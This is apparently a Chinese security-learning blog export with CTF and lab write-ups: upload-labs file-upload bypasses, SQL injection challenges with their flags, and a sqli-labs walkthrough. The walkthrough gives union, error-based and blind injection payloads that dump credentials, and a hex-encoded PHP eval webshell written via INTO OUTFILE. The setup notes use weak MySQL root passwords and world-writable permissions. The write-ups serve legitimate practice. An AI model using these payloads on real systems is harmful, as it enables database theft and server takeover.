src="/2019/08/10/upload-labs-master/19phpinfo1.png"><h2 id="法2-5"><a href="#法2-5" class="headerlink" title="法2"></a>法2</h2><p>把php后缀改为大写,比如Php</p><img src="/2019/08/10/upload-labs-master/19phpinfo2.png"><h2 id="法3-2"><a href="#法3-2" class="headerlink" title="法3"></a>法3</h2><p>(好像跟法1没什么区别)</p><p>上传真图片,保存名称的后缀改为Php,抓包加上phpinfo</p><img src="/2019/08/10/upload-labs-master/19method3upload.png"><p>URL处直接填Php文件的URL会打开上传的图片</p><p>配合文件包含使用即可</p><img src="/2019/08/10/upload-labs-master/19phpinfo3.png"><h2 id="法4-截断POST"><a href="#法4-截断POST" class="headerlink" title="法4 截断POST"></a>法4 截断POST</h2><p>可以用类似pass12的方法</p><p>抓包的时候在保存名字那里</p><p>把xxx.jpg改为xxx.phpa.jpg</p><img src="/2019/08/10/upload-labs-master/19rename.png"><p>然后到hex里面找到对应的a的hex编码,也就是61,改为00</p><p>forward即可</p><p>可以在URL直接使用文件  <strong>不需要配合文件包含</strong></p><p>但是不知道什么原因我上传错误</p><h2 id="法5"><a href="#法5" class="headerlink" title="法5"></a>法5</h2><p>由于move_uploaded_file这个函数会递归删除文件后面的/.</p><p>所以在’保存文件名’处变为xxx.php/.  即可</p><img src="/2019/08/10/upload-labs-master/19phpmove.png"><h1 id="pass20"><a href="#pass20" class="headerlink" title="pass20"></a>pass20</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>explode — 使用一个字符串分割另一个字符串</p><blockquote><p>array explode( string $delimiter, string $string[, int $limit] )</p><blockquote><p>此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 delimiter 作为边界点分割出来。 </p></blockquote></blockquote></blockquote><p>看源码发现既检查了MIME又检查了文件名</p><h2 id="法1-6"><a href="#法1-6" class="headerlink" title="法1"></a>法1</h2><p>直接上传图片马(真图片+抓包加上phpinfo)</p><img src="/2019/08/10/upload-labs-master/20phpinfo1.png"><h2 id="法2-6"><a href="#法2-6" class="headerlink" title="法2"></a>法2</h2><p>上传后的文件的后缀是由$file[count($file) - 1]来决定的</p><p>而且上方还有一个这样的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>所以只要让$file变为数组,则不会进入这个条件语句,而且使一个为[0],一个为[2]的话,$file[count($file)-1]就为空了,这样文件名最后就会是一个点了</p><p>抓包的时候的操作:</p><ul><li><p>content type</p></li><li><p>save_name后门加上[0]使其变为数组,这里是你想上传的文件的名字(比如2.php)</p></li><li><p>end(也就是save_name[2])的必须为allow_suffix中3种的一种(比如jpg)<br>因为$ext=end($file)</p></li></ul><img src="/2019/08/10/upload-labs-master/20payload.png">]]></content>
      
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiuSQL</title>
      <link href="/2019/07/31/ichunqiuSQL/"/>
      <url>/2019/07/31/ichunqiuSQL/</url>
      
        <content type="html"><![CDATA[<h1 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h1><p><a href="https://www.ichunqiu.com/battalion中web的SQL" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion中web的SQL</a></p><a id="more"></a><p>一开始的样子:</p><img src="/2019/07/31/ichunqiuSQL/start.png"><p>这题跟平常有点不一样,这题我尝试’ , “ , ‘“ , ‘) , “) , ‘“)都是不行的</p><p>然后直接什么都不加倒是可以直接来玩</p><h1 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h1><p>输入一个order by 4  会提示</p><blockquote><p>inj code!</p></blockquote><p>于是用注释符</p><p>最后发现这题只能用&lt;&gt;这种注释符</p><blockquote><p>ord&lt;&gt;er by 4</p></blockquote><p>无回显</p><blockquote><p>ord&lt;&gt;er by 3</p></blockquote><p>这下显示正常了</p><h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><blockquote><p>union se&lt;&gt;lect 1,2,3</p></blockquote><p>发现只有2显示</p><p>即可以利用2的这个位置来获取信息</p><blockquote><p>union se&lt;&gt;lect 1,database(),3</p></blockquote><img src="/2019/07/31/ichunqiuSQL/db.png" title="dbname"><h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><blockquote><p>union se&lt;&gt;lect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</p></blockquote><img src="/2019/07/31/ichunqiuSQL/table.png" title="tables"><h1 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h1><blockquote><p>union se&lt;&gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name=’user’</p></blockquote><img src="/2019/07/31/ichunqiuSQL/start.png"><p>跟开始一样,没有任何信息</p><p>试一试另外一个表</p><blockquote><p>union se&lt;&gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name=’info’</p></blockquote><img src="/2019/07/31/ichunqiuSQL/column.png" title="columns"><p>我看到有flag字样的马上去提交…发现是错误的</p><h1 id="值"><a href="#值" class="headerlink" title="值"></a>值</h1><blockquote><p>union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info</p></blockquote><img src="/2019/07/31/ichunqiuSQL/flag.png" title="flag"><p>成功爆出了flag</p><p>flag{e41571b9-ea94-4e24-8f52-f1158e7036c8}</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku成绩单</title>
      <link href="/2019/07/31/bugku%E6%88%90%E7%BB%A9%E5%8D%95/"/>
      <url>/2019/07/31/bugku%E6%88%90%E7%BB%A9%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h1 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h1><p><a href="http://123.206.87.240:8002/chengjidan/" target="_blank" rel="noopener">http://123.206.87.240:8002/chengjidan/</a></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习sql注入,恰好bugku有一道简单的注入题:成绩单</p><p>其实这题较早就接触过,但是当时还没有学习sql注入,对这样的题一窍不通,也没什么感觉</p><p>经过了一段时间sqli-labs-master base篇的练习后,能够做出这题</p><img src="/2019/07/31/bugku成绩单/start.png" title="开始界面"><p>看到有1,2,3,感觉像是只有3列,试了一下果然输入4就没了</p><h1 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h1><p>试了一下</p><blockquote><p>1’#</p></blockquote><p>是跟1一样的效果,说明这是单引号无括号那种查询语句</p><!--# 猜列数--><h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="列"><a href="#列" class="headerlink" title="列"></a>列</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'fl4g'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="值"><a href="#值" class="headerlink" title="值"></a>值</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,skctf_flag <span class="keyword">from</span> fl4g<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>BUGKU{Sql_INJECT0N_4813drd8hz4}</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>no privileges on mysql</title>
      <link href="/2019/07/28/no-privileges-on-mysql/"/>
      <url>/2019/07/28/no-privileges-on-mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="在Ubuntu18-04上搭建sqli-labs遇到的问题"><a href="#在Ubuntu18-04上搭建sqli-labs遇到的问题" class="headerlink" title="在Ubuntu18.04上搭建sqli-labs遇到的问题"></a>在Ubuntu18.04上搭建sqli-labs遇到的问题</h1><h2 id="普通用户无权限登录MySQL-修改加密方式"><a href="#普通用户无权限登录MySQL-修改加密方式" class="headerlink" title="普通用户无权限登录MySQL,修改加密方式"></a>普通用户无权限登录MySQL,修改加密方式</h2><p>安装好环境后,把sqli-labs-master文件夹放到/var/www/html里,本以为万事大吉可以开始玩injection了<br>怎料显示个</p><blockquote><p>Access denied for user ‘root’@’localhost’</p></blockquote><a id="more"></a><p>立马<a href="https://blog.csdn.net/weixin_41115274/article/details/78974472" target="_blank" rel="noopener">搜索一波–weixin_41115274-[CSDN]</a><br>发现是安装环境的时候埋下的祸根<br>马上搜索如何解决</p><ul><li>su了之后登录MySQL</li><li>select user, plugin from mysql.user;</li><li>可以看到root在plugin这一项是auto_socket,其他的都是mysql_native_password,此时需要把auto_socket改为mysql_native_password</li><li>语句1:update mysql.user set authentication_string=PASSWORD(‘123456’),plugin=’mysql_native_password’ where user=’root’;<br>flush privileges;清缓存</li><li>语句2:mysql&gt; ALTER USER ‘root’@’%’ IDENTIFIED WITH mysql_native_password BY ‘123456’;<br>(我用的是语句2)</li></ul><p><a href="https://blog.csdn.net/bingjianIT/article/details/82780535" target="_blank" rel="noopener">语句1–codekongs-[CSDN]</a><br><a href="https://blog.csdn.net/weixin_41725862/article/details/88045476" target="_blank" rel="noopener">语句2–行走的猪蹄子-[CSDN]</a></p><h1 id="在Ubuntu18-04搭建网站遇到的问题"><a href="#在Ubuntu18-04搭建网站遇到的问题" class="headerlink" title="在Ubuntu18.04搭建网站遇到的问题"></a>在Ubuntu18.04搭建网站遇到的问题</h1><p>作为一名超级新的萌新,以前搭站都是在Windows利用phpstudy搭的…<br>后来被师傅劝告在虚拟机上搭会比较好<br>因此学习一下怎样在虚拟机上搭站<br><a href="https://blog.csdn.net/timothy93bp/article/details/77530555" target="_blank" rel="noopener">MySQL+php7.0</a><br><a href="https://blog.csdn.net/qq_42280544/article/details/83904046" target="_blank" rel="noopener">MySQL+php5.6</a><br>为了省事我全用root来跟步骤…可能因为这样导致后来需要给权限才能正常工作</p><ul><li><p>给一个文件夹及其子文件777权限:</p><blockquote><p>chmod -r 777 文件夹名</p></blockquote></li><li><p>导入数据库:</p><blockquote><p>mysql -uroot -p 库名 &lt; xxx.sql</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> keng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blogs from wordpress to hexo</title>
      <link href="/2019/07/27/blogs-from-wordpress-to-hexo/"/>
      <url>/2019/07/27/blogs-from-wordpress-to-hexo/</url>
      
        <content type="html"><![CDATA[<p>作为一名零氪党,受不了wordpress的慢速后,将小站转移到hexo阵营</p><a id="more"></a><p>下面是将wordpress的文章转移到hexo上的步骤</p><ul><li>wordpress:导出文章</li><li>hexo:安装插件👇<blockquote><p>npm install hexo-migrator-wordpress –save</p><blockquote><p>如果报错:<br>npm WARN deprecated <a href="mailto:left-pad@1.3.0" target="_blank" rel="noopener">left-pad@1.3.0</a>: use String.prototype.padStart()</p><blockquote><p>则改成淘宝源<br>先改成淘宝源npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a><br> 再安装一遍npm install hexo-migrator-wordpress –save<br> 然后会提示要安装eslint<br> 于是安装eslintnpm install eslint –save<br> 这时会提示要安装acorn<br> 继续安装acornnpm install acorn –save<br> 这个时候再重新安装一次migrator</p></blockquote></blockquote></blockquote></li></ul><ul><li>导入文章👇<blockquote><p>hexo migrate wordpress &lt;source&gt;</p></blockquote></li></ul><p><a href="https://www.jianshu.com/p/75989cd399a6" target="_blank" rel="noopener">jsyzchen-简书</a><br><a href="https://segmentfault.com/q/1010000019471594" target="_blank" rel="noopener">jokrface的回答-segmentfault</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> keng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地图片显示不出来的解决方案</title>
      <link href="/2019/07/27/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9D%91/"/>
      <url>/2019/07/27/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="刚开始用hexo遇到的坑之一-hexo显示不了本地图片"><a href="#刚开始用hexo遇到的坑之一-hexo显示不了本地图片" class="headerlink" title="刚开始用hexo遇到的坑之一:hexo显示不了本地图片"></a>刚开始用hexo遇到的坑之一:hexo显示不了本地图片</h1><p>刚开始用hexo写blog,不是很懂markdown,也不是很懂hexo的markdown.</p><p>用markdown语法的! [ ] ( )来po图,写的时候是可以看见的,但generate上hexo就不行了…</p><a id="more"></a><p>搜索了一下发现<a href="http://www.dongcoder.com/detail-1269676.html" target="_blank" rel="noopener">要这样操作</a></p><ul><li>装插件👇<blockquote><p>npm install <a href="https://github.com/7ym0n/hexo-asset-image" target="_blank" rel="noopener">https://github.com/7ym0n/hexo-asset-image</a> –save</p></blockquote></li><li>把_config.yml里面的post_asset_folder改为<strong>true</strong>(这样的话每当hexo new 一个新.md文件的同时,会在[layout]新建一个同名的文件夹以用来存放资料)</li><li>用这样的标签来插入图片👇<blockquote><p>{ % asset_img 图片的名称+后缀(图片的相对路径) 对图片的解释% }</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> keng </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master</title>
      <link href="/2019/07/25/sqli-labs-master/"/>
      <url>/2019/07/25/sqli-labs-master/</url>
      
        <content type="html"><![CDATA[<h1 id="les1-GET-Error-based-Single-quotes-String"><a href="#les1-GET-Error-based-Single-quotes-String" class="headerlink" title="les1:GET-Error based-Single quotes-String"></a>les1:GET-Error based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-master/1start.png"><a id="more"></a><p>看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]</p><img src="/2019/07/25/sqli-labs-master/1formaltest.png"><p>有回显,则没毛病,再来个id=1’试试[单引号测试]</p><img src="/2019/07/25/sqli-labs-master/1singlequote.png"><p>竟然都不行,且从报错来看,查询语句是 <code>SELECT * FROM users WHERE id=&#39;1&#39;</code> <code>LIMIT 0,1;</code>这种结构的</p><p>(但是MySQL注释有3种写法①#注释[URL上要用%23注释]②– 注释(注释前面有个空格[URL上要写–%20注释])③<em>注释</em>[这种要成对出现,注入一般用不上])</p><p>那就试试id=1’ or 1=’1(万能密码之一)</p><img src="/2019/07/25/sqli-labs-master/1key.png"><p>有回显…但是这好像没什么卵用,还是用注释的来玩吧</p><p>姿势:?id=1’ order by 3– a或1’ order by 3 %23</p><img src="/2019/07/25/sqli-labs-master/1orderby.png"><p>姿势:?id=1’ order by 4– a或1’ order by 4 %23</p><p>3正常而4错误,则表是有3列的</p><p>接下来就要使用union联合查询(法一)</p><img src="/2019/07/25/sqli-labs-master/1unionselect.png"><p>姿势:?id=0’ union select 1,2,3</p><p>姿势之所以改为id=0而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可.</p><p>由上图可发现只显示出了2,3而1则不知道哪去了…所以我们只能2或3中选一个位置来爆其他信息</p><img src="/2019/07/25/sqli-labs-master/1position2.png"><p>姿势:?id=0’ union select 1,database(),version() %23</p><p>database():返回当前数据库连接使用的数据库</p><p>version(): 返回当前数据库的版本</p><p><strong>爆表:</strong></p><img src="/2019/07/25/sqli-labs-master/1table.png"><p>姿势:?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</p><p>还有dalao秀了一波报错型注入(法二)?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p><img src="/2019/07/25/sqli-labs-master/1baocuo.png"><p>姿势:?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+<br>这id=1好像不怎么影响???</p><p>爆出的表有emails,referers,uagents,users</p><p><strong>爆列(字段):</strong></p><img src="/2019/07/25/sqli-labs-master/1column.png"><p>姿势:?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ %23</p><img src="/2019/07/25/sqli-labs-master/1column2.png"><p>姿势: ?id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’))) –+</p><p>爆出users表中的列(字段)有id,username和password</p><p>where语句等号后面的值不能纯英文,比如users需要用’users’单引号,或者使用users的十六进制where=0x7573657273</p><p><strong>爆值:</strong></p><img src="/2019/07/25/sqli-labs-master/1zhi1.png"><p>姿势:?id=0’ union select 1,concat(username,0x26,password),3 from users %23</p><img src="/2019/07/25/sqli-labs-master/1zhi2.png"><p>姿势:id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) –+</p><p>爆出username和password的值,我用的符号是&amp;,即username&amp;password是一组</p><h1 id="les2-GET-Error-based-Intiger-based"><a href="#les2-GET-Error-based-Intiger-based" class="headerlink" title="les2:GET-Error based -Intiger based"></a>les2:GET-Error based -Intiger based</h1><p>开头跟les1一样,GET一个id=1,有回显,id=1’同样跟les1错误</p><p>但是id=1’ %23的时候,les1是正常的,les2却是错误</p><p>所以猜测查询语句为 <strong><code>SELECT * FROM users WHERE id=</code> <code>LIMIT 0,1;</code></strong></p><p>因此可以直接union查询试试是不是其他全都跟les1一样?id=1 union select 1,2,3</p><img src="/2019/07/25/sqli-labs-master/2unionselect.png"><p>发现这跟les1一模一样,直接走起</p><p>姿势跟les1差不多,只需去掉单引号’和最后的%23注释符/–+</p><h1 id="les3-GET-Error-based-Single-quotes-with-twist-String"><a href="#les3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="les3:GET-Error based Single quotes with twist-String"></a>les3:GET-Error based Single quotes with twist-String</h1><p>常规操作后,猜测语句是这样的: <code>SELECT * FROM users WHERE id=(&#39;1&#39;</code>) <code>LIMIT 0,1;</code></p><p>所以可以构造payload:</p><p>?id=0’)语句 %23</p><img src="/2019/07/25/sqli-labs-master/3unionselect.png"><img src="/2019/07/25/sqli-labs-master/3position3.png"><img src="/2019/07/25/sqli-labs-master/3zhi.png"><p>语句跟前两题一样…这题我只想着id=’input’) LIMIT 0,1,没有想到input前面也应该有个(所以我们要用)来闭合,我竟然想用(来闭合后面的,也试过?id=0)(union select 1,2,3或者是?id=0 union select 1,2,3(…这是因为一开始我觉得)是在LIMIT左边所以要这样来闭合…这也是对代码不够熟悉的问题</p><h1 id="les4-GET-Error-based-Double-Quotes-String"><a href="#les4-GET-Error-based-Double-Quotes-String" class="headerlink" title="les4:GET-Error based Double Quotes-String"></a>les4:GET-Error based Double Quotes-String</h1><img src="/2019/07/25/sqli-labs-master/4error.png"><p>常规操作、单引号操作都正常，回到题目所说的double quotes string，因此来给双引号测试，果然出错，因此猜测语句是这样的: <code>SELECT * FROM users WHERE id=(</code>“input”) <code>LIMIT 0,1;</code></p><p>然后操作跟之前就一样了，<strong>?id=0”) union select 1,2,3%23</strong></p><p>?id=0”)语句 %23</p><p>##les1-les4是union联合查询的题,分别是单引号,无引号,双引号,单引号带括号</p><h1 id="les5-GET-Double-injection-Single-Quotes-String"><a href="#les5-GET-Double-injection-Single-Quotes-String" class="headerlink" title="les5:GET-Double injection-Single Quotes-String"></a>les5:GET-Double injection-Single Quotes-String</h1><p>les4/5WP: <a href="https://www.jianshu.com/p/b502893dcc81" target="_blank" rel="noopener">https://www.jianshu.com/p/b502893dcc81</a></p><p>报错型注入: <a href="https://www.jianshu.com/p/8c2343705100" target="_blank" rel="noopener">https://www.jianshu.com/p/8c2343705100</a></p><img src="/2019/07/25/sqli-labs-master/5urin.png"><p>les5开头也是要输入id=数字，就GET一个id=1，然后就如上图所示，跟前4题好像有点不大一样</p><img src="/2019/07/25/sqli-labs-master/5single.png"><p>单引号测试，报错，猜测语句为<code>SELECT * FROM users WHERE id=&#39;input</code>‘ <code>LIMIT 0,1;</code></p><p>再看题目：double injection双注入，搜索了一下，有推荐这篇文章：<a href="http://www.2cto.com/article/201303/192718.html?jovova=hvwse3" target="_blank" rel="noopener">详细讲解双查询注入</a></p><p>文章讲到，双注入需要理解以下4个函数：</p><p>①rand()—随机函数—生成一个0到1的随机数</p><p>②floor()—取整函数—取浮点数的整数部分,如2.7123取2</p><p>③count()—汇总(聚合/计数)函数—返回查询对象的总数</p><p>④group by clause—分组语句—按clause对查询结果分组</p><p>select concat((select database()),floor(rand()*2));//如下图所示</p><img src="/2019/07/25/sqli-labs-master/5rand.png"><p><strong>数据库:</strong></p><p>?id=0’ union select count(*),2,concat(‘*‘,(select database()),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p><img src="/2019/07/25/sqli-labs-master/5database.png"><p>然后打算这样<strong>爆表名</strong></p><p>?id=0’ union select count(*),2,concat(‘*‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p><p>发现变成了You are in…… 但是有的dalao的WP明明是这样写的,看来还是要尝试其他姿势</p><p>尝试报错型注入: ?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+ /<em>没错这跟les1的是一样的</em>/</p><p>或者?id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)%23</p><img src="/2019/07/25/sqli-labs-master/5baocuo.png"><p>然后<strong>爆列</strong>?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’users’))) –+</p><img src="/2019/07/25/sqli-labs-master/5column.png"><p>然后<strong>爆值</strong>?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x26,password) from users)))–+</p><img src="/2019/07/25/sqli-labs-master/5zhi.png"><p>再<strong>爆值</strong>?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (‘Dumb’,’I-kill-you’))))–+</p><img src="/2019/07/25/sqli-labs-master/5zhi2.png"><p>好像也可以按延迟型注入来做…但暂时先按报错型注入来做吧</p><h1 id="les6-GET-Double-injection-Double-Quotes-String"><a href="#les6-GET-Double-injection-Double-Quotes-String" class="headerlink" title="les6:GET-Double injection-Double Quotes-String"></a>les6:GET-Double injection-Double Quotes-String</h1><p>跟les5差不多,只要把单引号变成双引号</p><p>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p><p>注意extractvalue,是extract,不是extra…</p><h1 id="les7-GET-Dump-into-Outfile"><a href="#les7-GET-Dump-into-Outfile" class="headerlink" title="les7:GET-Dump into Outfile"></a>les7:GET-Dump into Outfile</h1><p>看了一下源码,sql查询语句为:</p><pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre><p>看了一下题目,outfile,<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">搜索了一下outfile是怎么回事</a>,然后构造了这样的一个payload</p><pre><code>1&apos;)) select * from users into outfile &apos;D:/software/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.txt&apos; %23</code></pre><p>然后…什么事情都没有发生</p><p>–2019.7.20 23:52</p><p>继续，传个一句话木马上去</p><pre><code>id=1&apos;))union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B276D756D61275D293B203F3E into outfile &apos;D:/software/phpStudy/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.php&apos; %23</code></pre><p>不行，看到my.ini里面#secure_file_priv = D:/backup，去掉注释，重启phpstudy进入MySQL命令行</p><p>show variables like ‘secure_file_priv’;</p> {% asset_img 7.png %}<pre><code>然后http://localhost/sqli-labs-master/Less-7/?id=1%27)) union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B203F3E into outfile &quot;D:\\backup\\2.php&quot;) %23</code></pre><p>然后！还是不行。。。暂时跳过，<a href="https://blog.csdn.net/qq_44105778/article/details/86926128" target="_blank" rel="noopener">贴一下我看的WP</a></p><p>–2019.7.21 11:13</p><h1 id="les8-GET-Blind-Boolian-Single-Quotes-String"><a href="#les8-GET-Blind-Boolian-Single-Quotes-String" class="headerlink" title="les8:GET-Blind- Boolian- Single Quotes- String"></a>les8:GET-Blind- Boolian- Single Quotes- String</h1><p>看题目得知这是一道布尔型盲注的题,首先搜索一下<a href="https://www.jianshu.com/p/f0174ea6c69d" target="_blank" rel="noopener">布尔型盲注</a></p><p>有了前几题的经验直接来看看库名</p><pre><code>?id=1&apos; and left(database(),8)=&apos;security&apos; %23</code></pre><p>left ( string, n )        string为要截取的字符串，n(n&gt;0)为截取的长度(从第一个字符串开始)</p><p>看来库名还是security</p><p>再看看表名第一位</p><pre><code>?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23</code></pre><p>ascii()函数返回字符的ASCII码</p><p>substr(string,start,length)函数/mid(string,start,length)函数:从start位开始截取string,截取length位</p><p>select那个语句最后一定要有limit 